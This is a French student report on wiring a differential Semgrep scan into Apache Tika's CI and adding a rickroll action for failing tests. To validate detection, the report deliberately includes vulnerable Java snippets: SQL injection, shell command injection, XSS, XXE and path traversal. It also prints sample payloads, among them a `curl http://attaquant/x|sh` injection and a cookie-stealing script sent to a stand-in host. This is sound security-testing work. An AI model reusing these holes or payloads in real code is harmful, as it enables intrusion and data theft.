<!--
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  "License"); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
-->

# Tâche 3 — Semgrep dans le CI d'Apache Tika (et un rickroll)

Réalisé par David Correa Ruiz et Carlos Daniel Zelaya Quinteros.

- Dépôt : [CarlosDanielZQ/tika](https://github.com/CarlosDanielZQ/tika), branche [`tache3-semgrep`](https://github.com/CarlosDanielZQ/tika/tree/tache3-semgrep)
- Workflow modifié : [`.github/workflows/main-jdk17-build.yml`](../../.github/workflows/main-jdk17-build.yml)

| Livrable | Section |
|---|---|
| Le build échoue si un commit introduit une nouvelle vulnérabilité Semgrep | [1](#1-modification-du-workflow-github-actions) |
| Choix de conception et validation du workflow | [1.3](#13-choix-de-conception-et-justifications), [1.5](#15-validation-du-workflow) |
| 7 vulnérabilités de types différents | [2](#2-les-7-vulnérabilités-introduites) |
| Comparaison des rapports Semgrep avant / après | [3](#3-comparaison-des-rapports-semgrep-avant--après) |
| Rickroll quand un cas de test échoue | [4](#4-humour--rickroll-quand-un-test-échoue) |

---

## 1. Modification du workflow GitHub Actions

### 1.1. Objectif

Le workflow `main jdk17 build` du cas d'étude doit **échouer dès qu'un commit introduit une nouvelle vulnérabilité détectée par Semgrep**, sans être bloqué par les alertes déjà présentes dans Tika avant notre travail (11 alertes `p/java` sur le code d'origine, voir section 3).

### 1.2. Architecture retenue

```
main-jdk17-build.yml                          (push sur main, pull_request, workflow_dispatch)
 ├── semgrep    ──uses──►  semgrep-diff.yml   (workflow réutilisable)
 │                           1. checkout complet (fetch-depth: 0)
 │                           2. Semgrep 1.185.0 figé
 │                           3. calcul du commit de référence selon l'événement
 │                           4. semgrep scan --baseline-commit <ref> --error   ──► échec si ≥ 1 nouvelle alerte
 │                           5. résumé Markdown (Job Summary) + rapport JSON en artefact
 ├── build      needs: semgrep   ← n'est PAS lancé si semgrep échoue ; rickroll si un test échoue
 └── e2e-tests  needs: build     ← rickroll si un test échoue

semgrep-validation.yml   (push sur tache3-semgrep) : même contrôle, référence = origin/main, + rapport complet avant/après
rickroll-validation.yml  (push sur tache3-semgrep) : validation de l'action rickroll sans tout le build Maven
```

Fichiers concernés :

| Fichier | Rôle |
|---|---|
| [`.github/workflows/main-jdk17-build.yml`](../../.github/workflows/main-jdk17-build.yml) | Workflow du cas d'étude : ajout du job `semgrep`, `needs: semgrep` sur `build`, rickroll sur `build` et `e2e-tests` |
| [`.github/workflows/semgrep-diff.yml`](../../.github/workflows/semgrep-diff.yml) | Workflow réutilisable (`workflow_call`) contenant toute la logique Semgrep |
| [`.github/workflows/semgrep-validation.yml`](../../.github/workflows/semgrep-validation.yml) | Validation rapide sur la branche de travail + comparaison complète avant/après |
| [`.github/scripts/semgrep_report.py`](../../.github/scripts/semgrep_report.py) | Mise en forme des rapports JSON (résumé, comparaison avant/après) |
| [`.github/actions/rickroll/`](../../.github/actions/rickroll/) | Action composite réutilisable de rickroll |
| [`.github/workflows/rickroll-validation.yml`](../../.github/workflows/rickroll-validation.yml) | Validation de l'action rickroll |

### 1.3. Choix de conception et justifications

**Analyse différentielle (`--baseline-commit`).** Un scan complet de Tika rapporte déjà 11 alertes. Avec un simple `semgrep scan --error`, *tous* les builds échoueraient, y compris ceux qui n'ajoutent rien de dangereux, et le contrôle serait vite désactivé. `--baseline-commit <ref>` fait analyser par Semgrep le commit de référence et le commit courant, et ne rapporte que les alertes **absentes de la référence**. Le contrôle mesure donc exactement ce que l'énoncé demande : ce que les commits *introduisent*.

**Choix du commit de référence selon l'événement.** C'est le point le plus important du design :

| Événement | Commit de référence | Ce qui est vérifié |
|---|---|---|
| `pull_request` | `github.event.pull_request.base.sha` (pointe de la branche cible) | tous les commits de la PR |
| `push` | `github.event.before` (pointe de la branche avant le push) | les commits du push |
| `workflow_dispatch`, nouvelle branche (`before = 000…0`), force-push | `HEAD~1` | le dernier commit |
| appel avec `baseline-ref` (validation) | `git merge-base HEAD <baseline-ref>` | tout le travail depuis la bifurcation |

La première version utilisait toujours `git merge-base HEAD origin/main`. Lors d'un push sur `main`, cet ancêtre commun est `HEAD` lui-même : la comparaison était vide et un commit vulnérable poussé directement sur `main` passait sans alerte. La nouvelle logique compare chaque push à l'état précédent de la branche. Elle couvre donc aussi ce cas.

**Le contrôle de sécurité conditionne le build (`needs: semgrep`).** Dans la première version, les jobs `semgrep` et `build` étaient parallèles et indépendants : une vulnérabilité faisait échouer le workflow, mais le build Maven (environ 60 minutes) tournait quand même. Avec `needs: semgrep`, le build n'est même pas lancé et le workflow est en échec. C'est le sens le plus strict de « le processus de build échoue », et ça économise des minutes de CI.

**Workflow réutilisable plutôt que copier-coller.** La logique Semgrep existait en double (`main-jdk17-build.yml` et `semgrep-validation.yml`). Les deux copies avaient d'ailleurs déjà divergé (voir le bogue ci-dessous). Elle vit maintenant dans un seul fichier, `semgrep-diff.yml` (`on: workflow_call`), appelé par les deux workflows. Ce qui est validé sur la branche de travail est donc exactement ce qui tourne dans le build.

**Correction d'un bogue YAML.** Dans `main-jdk17-build.yml`, la commande était écrite `run:` *sans* `|`. YAML replie alors les lignes en une seule : `semgrep scan \ --config p/java \ …`. Pour bash, chaque `\ ` devient un espace littéral et Semgrep recevait des arguments comme `" --config"`. Le bloc `run: |` corrige le problème.

**Reproductibilité.** La version de Semgrep est figée (`1.185.0`) et Python est installé explicitement (`actions/setup-python`). Sans ça, une nouvelle version de Semgrep ou du jeu de règles pourrait faire échouer un build sans qu'aucun code n'ait changé. Pour les mises à jour, il suffit de changer `SEMGREP_VERSION` dans un commit dédié.

**Jeu de règles `p/java`.** Ce sont les 60 règles Java du registre Semgrep : crypto, injections, XXE, XSS, path traversal, etc. Nous avons écarté `p/default` et `p/security-audit`, qui couvrent beaucoup d'autres langages (YAML, Dockerfile, JavaScript des docs…). Ces règles ajoutent du bruit et du temps de scan pour un projet Java. Le jeu est un paramètre (`config`) du workflow réutilisable, donc facile à changer.

**Sécurité et traçabilité du job.** Le job utilise `permissions: contents: read` (moindre privilège) et `--metrics=off` (aucune télémétrie). Les valeurs venant de l'événement GitHub passent par des variables d'environnement, jamais interpolées directement dans le script, pour éviter l'injection dans le shell. Chaque exécution produit un **Job Summary** avec la liste des nouvelles alertes (règle, sévérité, CWE, `fichier:ligne`) et un artefact `semgrep-new-findings` (JSON complet).

### 1.4. Limites connues

- `--error` fait échouer le contrôle pour *toute* nouvelle alerte, quelle que soit sa sévérité (INFO, WARNING ou ERROR). C'est voulu : l'énoncé parle de « nouvelle vulnérabilité détectée ». Un faux positif devra être justifié par un commentaire `// nosemgrep: <règle>` revu en PR.
- Sur un push de plusieurs commits, le contrôle évalue le push dans son ensemble. Un commit vulnérable puis un commit correctif dans le même push ne bloquent donc pas.
- Le workflow garde le `paths-ignore: docs/**` d'origine : un commit qui ne touche que la documentation ne lance pas le build, ce qui est sans risque puisque Semgrep n'analyse que le Java.
- Semgrep ne détecte que ce que ses règles décrivent (voir 2.10) : l'absence d'alerte ne prouve pas l'absence de vulnérabilité.

### 1.5. Validation du workflow

| # | Scénario | Résultat attendu | Résultat obtenu |
|---|---|---|---|
| A | Scan complet du code d'origine, sans `--error` | 11 alertes préexistantes, job vert | ✅ 11 alertes, 60 règles, 1 468 fichiers ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43746199713)) |
| B | Scan différentiel sans nouvelle vulnérabilité | 0 nouvelle alerte, job vert | ✅ ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43807537450)) |
| C | Ajout progressif de vulnérabilités (1re version) | le nombre d'alertes suit les ajouts, job rouge | ✅ 1 → 7 alertes ([run final](https://github.com/CarlosDanielZQ/tika/actions/runs/43940925801)) |
| D | `semgrep-validation.yml` avec les 7 vulnérabilités finales (référence `origin/main`) | au moins une nouvelle alerte par vulnérabilité, job rouge, code de sortie 1 | ✅ 8 nouvelles alertes couvrant V1 à V7 (V7 est signalée par deux règles), code de sortie 1 ([run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624)) |
| E | `main-jdk17-build.yml` sur une PR `tache3-semgrep` → `main` (fork) qui introduit les 7 vulnérabilités ([PR #1](https://github.com/CarlosDanielZQ/tika/pull/1), fermée sans fusion) | `Semgrep Security Scan` rouge, `build` et `e2e-tests` **ignorés (skipped)**, workflow rouge | ✅ 8 nouvelles alertes par rapport à `main`, code de sortie 1, `build` et `e2e-tests` *skipped*, workflow en échec après 42 s au lieu d'environ 60 min ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43992516267)) |
| F | `main-jdk17-build.yml` sur une PR `tache3-validation-f` → `tache3-semgrep` qui modifie du Java **sans** ajouter de vulnérabilité : ajout de `executeSafeQuery`, la version corrigée de V3 avec `PreparedStatement` et un paramètre lié | `Semgrep Security Scan` vert (0 nouvelle alerte, malgré du code SQL très proche de V3), `build` lancé | ✅ « Aucune nouvelle alerte par rapport au commit de référence », Semgrep vert, `build` lancé ([PR #2](https://github.com/CarlosDanielZQ/tika/pull/2), fermée sans fusion, [run](https://github.com/CarlosDanielZQ/tika/actions/runs/43994679815)). Le build Maven a ensuite échoué après 33 min sur `S3PipeIntegrationTest`, pour une raison sans lien avec Semgrep (voir 1.6). |

Les scénarios A à C ont été réalisés avec la première version du workflow. Les scénarios D à F valident la version finale.

**Note sur `workflow_dispatch`.** Le déclencheur manuel ajouté au workflow n'est utilisable qu'une fois le fichier présent sur la branche par défaut (`main`) du dépôt : GitHub n'affiche le bouton « Run workflow » que dans ce cas. Les scénarios E et F passent donc par des pull requests. C'est d'ailleurs l'usage visé : bloquer une PR qui introduit une vulnérabilité.

### 1.6. Échec du build Maven indépendant de Semgrep

Dans le scénario F, le contrôle Semgrep a laissé passer le commit et le build Maven complet a démarré. Il a échoué après 33 minutes dans le module `tika-pipes-integration-tests`. Le test `S3PipeIntegrationTest` démarre un serveur MinIO avec Docker Compose (Testcontainers), et la commande `compose up -d` échoue sur le runner GitHub (« Local Docker Compose exited abnormally with code 1 »). C'est le même problème que celui observé lors des premières expérimentations. Il touche le code d'origine de Tika et n'a aucun lien avec nos modifications.

Conséquences :

- Les modules construits avant cet échec, dont `tika-core` qui contient `SemgrepSecurityDemo` et `RickrollDemoTest`, ont passé Spotless, checkstyle, forbiddenapis, la compilation et leurs tests.
- `tika-server` vient après `tika-pipes` dans l'ordre du réacteur Maven. `SemgrepVulnerableResource` n'a donc pas été compilée par ce build. Elle a été compilée localement avec `javac` contre les signatures des API Jakarta utilisées.
- Ce vrai échec de test a déclenché le **rickroll dans le build principal** (voir 4.2).

---

## 2. Les 7 vulnérabilités introduites

### 2.1. Vue d'ensemble

Chaque vulnérabilité appartient à une **catégorie CWE différente** et déclenche une **règle Semgrep différente** :

| # | Type de vulnérabilité | CWE | Fichier:ligne | Règle(s) Semgrep (`p/java`) | Sévérité |
|---|---|---|---|---|---|
| V1 | Transmission en clair | CWE-319 | `SemgrepSecurityDemo.java:46` | `unencrypted-socket` | WARNING |
| V2 | Chiffrement trop faible (DES) | CWE-326 | `SemgrepSecurityDemo.java:54` | `des-is-deprecated` | WARNING |
| V3 | Injection SQL | CWE-89 | `SemgrepSecurityDemo.java:62` | `formatted-sql-string` | ERROR |
| V4 | XML External Entity (XXE) | CWE-611 | `SemgrepSecurityDemo.java:72` | `documentbuilderfactory-disallow-doctype-decl-missing` | ERROR |
| V5 | Path traversal | CWE-22 | `SemgrepVulnerableResource.java:53` | `jax-rs-path-traversal` | WARNING |
| V6 | Injection de commande système | CWE-78 | `SemgrepVulnerableResource.java:72` | `tainted-cmd-from-http-request` | ERROR |
| V7 | Cross-site scripting (XSS) réfléchi | CWE-79 | `SemgrepVulnerableResource.java:88` | `servletresponse-writer-xss` + `no-direct-response-writer` | ERROR + WARNING |

Les 7 vulnérabilités sont toutes détectées : c'est le Job Summary du [run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624). Les CWE et les sévérités sont celles déclarées par les règles. Semgrep produit **8 alertes pour 7 vulnérabilités** parce que V7 déclenche deux règles indépendantes de `p/java` :

- `servletresponse-writer-xss` suit la donnée de `request.getParameter` jusqu'à `getWriter().write`.
- `no-direct-response-writer` signale toute écriture directe dans la réponse HTTP, sans moteur de gabarits qui encoderait la sortie.

Les deux décrivent la même faille (CWE-79), à la même ligne.

**Pourquoi avoir remplacé la première version ?** La première version comptait bien 7 alertes, mais 5 d'entre elles (MD5, SHA-1, DES, RC4, Blowfish) relèvent de la même famille : algorithme cryptographique faible (CWE-326/327/328). L'énoncé exige 7 vulnérabilités **de types différents**. Nous avons donc gardé un seul représentant de la crypto faible (DES) et ajouté XXE, path traversal, injection de commande et XSS. Ce sont des mécanismes d'attaque différents, avec des conséquences différentes (lecture de fichiers, exécution de code, vol de session…).

### 2.2. Choix des fichiers

- **`tika-core/src/main/java/org/apache/tika/SemgrepSecurityDemo.java`** (V1 à V4). `tika-core` est le module dont dépendent tous les autres. Une faiblesse dans une méthode utilitaire de ce module se propagerait à toute l'application. Ces quatre vulnérabilités n'utilisent que le JDK (`java.net`, `javax.crypto`, `java.sql`, `javax.xml`), il n'y a donc aucune dépendance à ajouter. V4 est particulièrement réaliste pour Tika : Tika analyse des documents XML venant de l'extérieur et fournit `XMLReaderUtils` justement pour créer des parseurs protégés contre XXE. V4 contourne cette protection.
- **`tika-server/tika-server-core/src/main/java/org/apache/tika/server/core/resource/SemgrepVulnerableResource.java`** (V5 à V7). Path traversal, injection de commande et XSS sont des vulnérabilités **d'application web**. `tika-server-core` est le seul module de Tika qui expose une API HTTP (ressources JAX-RS, dépendance `jakarta.servlet-api`). La ressource suit le style des ressources existantes (`TikaResource`, `TranslateResource`). Les règles Semgrep correspondantes ont besoin d'une **source d'entrée non fiable** : `@PathParam` ou `HttpServletRequest`. Elles ne peuvent pas se déclencher dans `tika-core`.
- **Isolation.** Les deux classes ne sont appelées nulle part. La ressource n'est **pas enregistrée** dans `TikaServerProcess`, qui déclare explicitement chaque ressource. Elle n'est donc jamais exposée par le serveur. Le comportement et les tests de Tika restent inchangés. Les deux classes respectent les contrôles du build (Spotless, checkstyle, forbiddenapis, Apache RAT) pour que seul Semgrep fasse échouer le CI.

### 2.3. V1 — Transmission en clair (CWE-319)

```java
Socket socket = new Socket();
```

**Pourquoi c'est vulnérable.** Une `java.net.Socket` transporte les octets tels quels, sans chiffrement ni authentification du serveur. Toute personne sur le chemin réseau (Wi-Fi public, routeur compromis) peut lire ou modifier les données : documents envoyés à Tika, métadonnées, identifiants.
**Correction.** Utiliser `SSLSocketFactory.getDefault().createSocket(...)` (TLS).
**Résultat Semgrep.** ✅ Règle `java.lang.security.audit.crypto.unencrypted-socket.unencrypted-socket`, WARNING, ligne 46.

### 2.4. V2 — Chiffrement trop faible : DES (CWE-326)

```java
return Cipher.getInstance("DES/ECB/PKCS5Padding");
```

**Pourquoi c'est vulnérable.** DES n'a qu'une clé effective de 56 bits, cassable en quelques heures par force brute sur du matériel dédié. Le mode ECB chiffre deux blocs identiques de la même façon, ce qui laisse voir la structure des données.
**Correction.** `Cipher.getInstance("AES/GCM/NoPadding")` avec une clé de 256 bits et un nonce unique.
**Résultat Semgrep.** ✅ Règle `java.lang.security.audit.crypto.des-is-deprecated.des-is-deprecated`, WARNING, ligne 54.

### 2.5. V3 — Injection SQL (CWE-89)

```java
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
return statement.executeQuery(query);
```

**Pourquoi c'est vulnérable.** L'entrée est concaténée dans la requête. Avec `userInput = "' OR '1'='1"`, la clause devient toujours vraie et toute la table est renvoyée. D'autres charges permettent de modifier ou de supprimer des données.
**Correction.** `PreparedStatement` avec un paramètre lié (`WHERE name = ?`).
**Résultat Semgrep.** ✅ Règle `java.lang.security.audit.formatted-sql-string.formatted-sql-string`, ERROR, ligne 62.

### 2.6. V4 — XML External Entity, XXE (CWE-611)

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
return builder.parse(xml);
```

**Pourquoi c'est vulnérable.** Avec sa configuration par défaut, la fabrique accepte les `DOCTYPE` et les entités externes. Un document piégé contenant `<!ENTITY x SYSTEM "file:///etc/passwd">` fait lire un fichier local par le parseur. On peut aussi forcer des requêtes réseau internes (SSRF), ou épuiser la mémoire (« billion laughs »). Pour Tika, dont le métier est de lire des documents non fiables, c'est l'une des vulnérabilités les plus graves.
**Correction.** `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`, ou simplement `XMLReaderUtils` de Tika.
**Résultat Semgrep.** Règle `java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing` (analyse de flux : la fabrique atteint `newDocumentBuilder()` sans avoir été sécurisée). ✅ ERROR, ligne 72.

### 2.7. V5 — Path traversal (CWE-22)

```java
@GET
@Path("/document/{name}")
public String readDocument(@PathParam("name") String name) throws IOException {
    File document = new File(DOCUMENTS_DIR, name);
    return Files.readString(document.toPath(), UTF_8);
}
```

**Pourquoi c'est vulnérable.** Le segment d'URL est utilisé tel quel comme nom de fichier. `GET /semgrep-demo/document/..%2F..%2F..%2Fetc%2Fpasswd` remonte hors de `/var/tika/documents/` et renvoie n'importe quel fichier lisible par le serveur (configuration, clés…).
**Correction.** Normaliser le chemin et vérifier qu'il reste dans le répertoire : `base.resolve(name).normalize().startsWith(base)`, ou n'accepter que `FilenameUtils.getName(name)`.
**Résultat Semgrep.** ✅ Règle `java.jax-rs.security.jax-rs-path-traversal.jax-rs-path-traversal`, WARNING, ligne 53 (la méthode qui reçoit le `@PathParam`).

### 2.8. V6 — Injection de commande système (CWE-78)

```java
String file = request.getParameter("file");
List<String> command = new ArrayList<>();
command.add("sh");
command.add("-c");
command.add("file --mime-type " + file);
Process process = new ProcessBuilder(command).start();
```

**Pourquoi c'est vulnérable.** Le paramètre HTTP est concaténé dans une chaîne interprétée par `sh -c`. Avec `?file=x;curl http://attaquant/x|sh`, le shell exécute la seconde commande : exécution de code arbitraire sur le serveur, c'est-à-dire une compromission complète.
**Correction.** Ne pas passer par un shell : `new ProcessBuilder("file", "--mime-type", "--", file)`, après avoir validé `file` sur une liste blanche. Ici, la détection de type MIME de Tika (`Tika.detect`) suffit de toute façon.
**Résultat Semgrep.** Règle `java.lang.security.audit.tainted-cmd-from-http-request.tainted-cmd-from-http-request`. C'est une règle de *taint* : la donnée part de `HttpServletRequest` (source) et atteint la liste d'arguments du processus (puits). ✅ ERROR, ligne 72 (`command.add("file --mime-type " + file)`).

### 2.9. V7 — Cross-site scripting réfléchi (CWE-79)

```java
String name = request.getParameter("name");
response.setContentType("text/html;charset=UTF-8");
response.getWriter().write(name);
```

**Pourquoi c'est vulnérable.** Le paramètre est renvoyé dans une page HTML sans encodage. Un lien `?name=<script>fetch('//attaquant?c='+document.cookie)</script>` envoyé à une victime exécute ce JavaScript dans son navigateur, dans le contexte du serveur Tika : vol de session, actions en son nom.
**Correction.** Encoder la sortie (`Encode.forHtml(name)` d'OWASP Encoder) ou répondre en `text/plain`.
**Résultat Semgrep.** ✅ Deux règles à la ligne 88 :

- `java.lang.security.servletresponse-writer-xss.servletresponse-writer-xss` (ERROR) ;
- `java.lang.security.audit.xss.no-direct-response-writer.no-direct-response-writer` (WARNING).

Voir 2.1.

### 2.10. Essais non détectés par `p/java` (et pourquoi)

La première version avait aussi essayé quatre constructions vulnérables que Semgrep n'a pas signalées. La lecture des 60 règles de `p/java` explique pourquoi :

| Essai | Raison de l'absence d'alerte |
|---|---|
| Désérialisation Java native (`ObjectInputStream.readObject`) | `p/java` ne couvre que la désérialisation Jackson (`enableDefaultTyping`) et JMS, pas `ObjectInputStream` |
| `java.util.Random` pour un jeton | aucune règle de `p/java` ne vise `java.util.Random` |
| Validation TLS désactivée (`TrustManager` vide) | aucune règle de `p/java` ne vise `X509TrustManager` (seule `weak-ssl-context` vise les vieilles versions de TLS) |
| Injection de commande sans requête HTTP | `tainted-cmd-from-http-request` exige que la donnée vienne d'un `HttpServletRequest` : une simple chaîne en paramètre de méthode n'est pas une source |

D'où le placement de V6 dans une ressource web qui reçoit un vrai `HttpServletRequest`. Ces essais montrent aussi la principale limite d'un outil SAST : il ne trouve que ce que ses règles décrivent.

---

## 3. Comparaison des rapports Semgrep avant / après

### 3.1. Méthode

La comparaison est automatisée dans le job `full-report` de [`semgrep-validation.yml`](../../.github/workflows/semgrep-validation.yml) :

1. **Avant** : le commit `git merge-base HEAD origin/main`, c'est-à-dire Tika tel que nous l'avons reçu, est extrait dans un `git worktree` séparé, puis un scan **complet** `p/java` est lancé.
2. **Après** : scan complet du commit courant, avec la même version de Semgrep et les mêmes règles.
3. [`semgrep_report.py compare`](../../.github/scripts/semgrep_report.py) compare les deux rapports JSON. Une alerte est identifiée par *(règle, fichier, code source visé)* et non par son numéro de ligne. Une alerte préexistante dont la ligne s'est seulement déplacée n'est donc pas comptée comme nouvelle.

Les deux rapports JSON et le tableau de comparaison sont publiés dans le Job Summary et dans l'artefact `semgrep-full-reports`.

La première version comparait un scan complet (11 alertes sur 1 468 fichiers) à un scan différentiel (7 alertes sur 1 fichier). Les deux nombres ne mesuraient pas la même chose. Ici, les deux scans portent sur tout le dépôt.

### 3.2. Résultats

Résultats du job `full-report` ([run #23](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070624), Semgrep 1.185.0, `p/java`) :

| | Avant (`a2d75c2c1`, Tika d'origine) | Après (`18fcd62ad`, 7 vulnérabilités) |
|---|---|---|
| Fichiers analysés | 1 468 | 1 470 (+2 : nos deux classes) |
| Alertes | 11 | 19 |
| Nouvelles alertes | — | **8** |
| Alertes disparues | — | 0 |

Alertes nouvellement introduites :

| # | Règle | Sévérité | CWE | Emplacement | Vulnérabilité |
|---|---|---|---|---|---|
| 1 | `unencrypted-socket` | WARNING | CWE-319 | `SemgrepSecurityDemo.java:46` | V1 |
| 2 | `des-is-deprecated` | WARNING | CWE-326 | `SemgrepSecurityDemo.java:54` | V2 |
| 3 | `formatted-sql-string` | ERROR | CWE-89 | `SemgrepSecurityDemo.java:62` | V3 |
| 4 | `documentbuilderfactory-disallow-doctype-decl-missing` | ERROR | CWE-611 | `SemgrepSecurityDemo.java:72` | V4 |
| 5 | `jax-rs-path-traversal` | WARNING | CWE-22 | `SemgrepVulnerableResource.java:53` | V5 |
| 6 | `tainted-cmd-from-http-request` | ERROR | CWE-78 | `SemgrepVulnerableResource.java:72` | V6 |
| 7 | `no-direct-response-writer` | WARNING | CWE-79 | `SemgrepVulnerableResource.java:88` | V7 |
| 8 | `servletresponse-writer-xss` | ERROR | CWE-79 | `SemgrepVulnerableResource.java:88` | V7 |

Nombre d'alertes par règle :

| Règle | Avant | Après | Différence |
|---|---|---|---|
| `unencrypted-socket` | 4 | 5 | +1 |
| `des-is-deprecated` | 0 | 1 | +1 |
| `formatted-sql-string` | 2 | 3 | +1 |
| `documentbuilderfactory-disallow-doctype-decl-missing` | 1 | 2 | +1 |
| `jax-rs-path-traversal` | 0 | 1 | +1 |
| `tainted-cmd-from-http-request` | 0 | 1 | +1 |
| `servletresponse-writer-xss` | 0 | 1 | +1 |
| `no-direct-response-writer` | 0 | 1 | +1 |
| `saxparserfactory-disallow-doctype-decl-missing` | 1 | 1 | 0 |
| `xmlinputfactory-possible-xxe` | 1 | 1 | 0 |
| `use-of-aes-ecb` | 1 | 1 | 0 |
| `use-of-sha1` | 1 | 1 | 0 |

### 3.3. Interprétation

- **Aucune alerte d'origine n'a disparu ou changé** (0 alerte disparue). Les 11 alertes de Tika (sockets, SQL, XXE, AES-ECB, SHA-1) sont des faiblesses historiques hors du périmètre de la tâche, et c'est exactement ce que l'analyse différentielle ignore.
- **Les 8 nouvelles alertes couvrent les 7 vulnérabilités**, une ou deux par vulnérabilité, toutes dans nos 2 fichiers. Aucune alerte n'apparaît ailleurs dans Tika.
- Pour 4 règles, Tika avait déjà des alertes (par exemple `unencrypted-socket` : 4 → 5). Comparer seulement les noms de règles ou les totaux ne suffit donc pas pour savoir ce qui est nouveau. C'est la comparaison alerte par alerte qui identifie précisément les 8 nouvelles.
- Le scan différentiel du CI (job `Semgrep (nouvelles vulnerabilites)` du même run) rapporte **les mêmes 8 alertes** que la comparaison complète. Le contrôle du build bloque donc exactement ce qui a été introduit, ni plus ni moins.

---

## 4. Humour : rickroll quand un test échoue

### 4.1. Implémentation

Nous avons écrit notre propre action composite réutilisable, [`.github/actions/rickroll`](../../.github/actions/rickroll/) ([`action.yml`](../../.github/actions/rickroll/action.yml) + [`rickroll.py`](../../.github/actions/rickroll/rickroll.py), Python standard, sans dépendance) :

1. Elle lit les rapports JUnit XML produits par Maven (`surefire-reports`, `failsafe-reports`).
2. **Si au moins un cas de test a échoué**, elle :
   - affiche une bannière ASCII « Rickrolled! » et la liste des tests en échec dans le journal ;
   - crée une **annotation d'erreur** visible sur la page du run, avec le lien vers la vidéo ;
   - ajoute au **Job Summary** la miniature cliquable de la vidéo et un tableau des tests en échec (classe, test, message).
3. Si le job a échoué pour une autre raison (compilation, checkstyle…), elle publie seulement une notice : **pas de rickroll sans test en échec**, conformément à l'énoncé.
4. Elle ne modifie jamais le résultat du job. Ses sorties `failed-tests` et `rickrolled` peuvent être réutilisées.

Elle est invoquée dans `main-jdk17-build.yml` après chaque étape Maven qui lance des tests :

```yaml
- name: Rickroll on test failure
  if: failure() && steps.maven.outcome == 'failure'
  uses: ./.github/actions/rickroll
  with:
    reports: "**/target/surefire-reports/TEST-*.xml"
```

D'autres dépôts peuvent la réutiliser avec `uses: CarlosDanielZQ/tika/.github/actions/rickroll@tache3-semgrep`.

**Pourquoi une implémentation maison plutôt que modifier `random-rickroll` ?** Nous voulions un déclenchement **précis** (« un cas de test échoue », lu dans les rapports JUnit, et pas « n'importe quelle étape a échoué »), aucune dépendance externe ni jeton supplémentaire, et du code que nous pouvons expliquer ligne par ligne.

### 4.2. Validation

Faire échouer le vrai build de Tika pour tester l'action aurait coûté environ 60 minutes par essai et aurait demandé de casser un vrai test. Nous avons plutôt ajouté :

- [`RickrollDemoTest`](../../tika-core/src/test/java/org/apache/tika/RickrollDemoTest.java) : un test qui échoue volontairement, **mais seulement si** la variable d'environnement `TIKA_RICKROLL_DEMO=true` est définie (`@EnabledIfEnvironmentVariable`). Dans tous les builds normaux, il est ignoré.
- [`rickroll-validation.yml`](../../.github/workflows/rickroll-validation.yml), qui ne compile que `tika-core` et lance ce test dans deux jobs :

| Job | Variable | Résultat attendu | Résultat obtenu |
|---|---|---|---|
| `test-fails` | `TIKA_RICKROLL_DEMO=true` | job rouge, rickroll (bannière, annotation, Job Summary) | ✅ job rouge, étape rickroll exécutée : annotation « Rickroll (1 test(s) en echec) » et Job Summary avec la vidéo et le test `RickrollDemoTest#testNeverGonnaGiveYouUp` ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070733)) |
| `test-passes` | absente | test ignoré, job vert, aucun rickroll | ✅ job vert, étape rickroll ignorée (*skipped*) (même [run](https://github.com/CarlosDanielZQ/tika/actions/runs/43988070733)) |

**Rickroll dans le vrai build.** Dans le scénario F (section 1.6), un vrai test de Tika a échoué dans `main jdk17 build` : `S3PipeIntegrationTest` (erreur Docker Compose). L'action s'est déclenchée sans intervention de notre part : annotation « Rickroll (1 test(s) en echec) » et Job Summary « Rickroll ! 1 cas de test en echec » avec la classe et le message d'erreur ([run](https://github.com/CarlosDanielZQ/tika/actions/runs/43994679815)). C'est exactement le comportement demandé. Ce run a aussi révélé un petit défaut : l'erreur survenait pendant l'initialisation de la classe de test, et le `<testcase>` JUnit n'avait pas de nom. L'action affiche maintenant « (initialisation de la classe) » au lieu d'une cellule vide.

Le script a aussi été testé localement avec un faux rapport JUnit contenant un test en échec (rickroll déclenché, sorties `failed-tests=1`, `rickrolled=true`) et sans rapport (notice, pas de rickroll).

---

## 5. Reproduire

```bash
# Comparaison avant / après en local (Linux, macOS ou WSL)
pip install semgrep==1.185.0
git worktree add --detach /tmp/before "$(git merge-base HEAD origin/main)"
(cd /tmp/before && semgrep scan --config p/java --metrics=off --json-output=/tmp/before.json .)
semgrep scan --config p/java --metrics=off --json-output=/tmp/after.json .
python .github/scripts/semgrep_report.py compare /tmp/before.json /tmp/before /tmp/after.json .

# Contrôle différentiel identique au CI
semgrep scan --config p/java --baseline-commit "$(git merge-base HEAD origin/main)" --error --metrics=off .
```

## 6. Déclaration d'utilisation de l'IA

Nous avons utilisé **ChatGPT (OpenAI)** en novembre 2026 comme assistant technique pour la première version : intégration de Semgrep aux workflows, configuration de l'analyse différentielle, interprétation des résultats et propositions de vulnérabilités à expérimenter.

Nous avons ensuite utilisé **Claude (Anthropic, via Claude Code)** en novembre 2026 pour réviser cette première version. Il a relevé le bogue YAML, la référence `merge-base` inefficace sur `main`, les vulnérabilités du même type et la comparaison non homogène. Il nous a aidés à écrire le workflow réutilisable, le script de comparaison, l'action rickroll, les vulnérabilités V4 à V7 (calquées sur les cas de test officiels des règles Semgrep) et cette documentation.

Nous avons relu, compris et validé l'ensemble du code et du texte. Les résultats présentés proviennent des exécutions GitHub Actions dont les liens sont donnés.
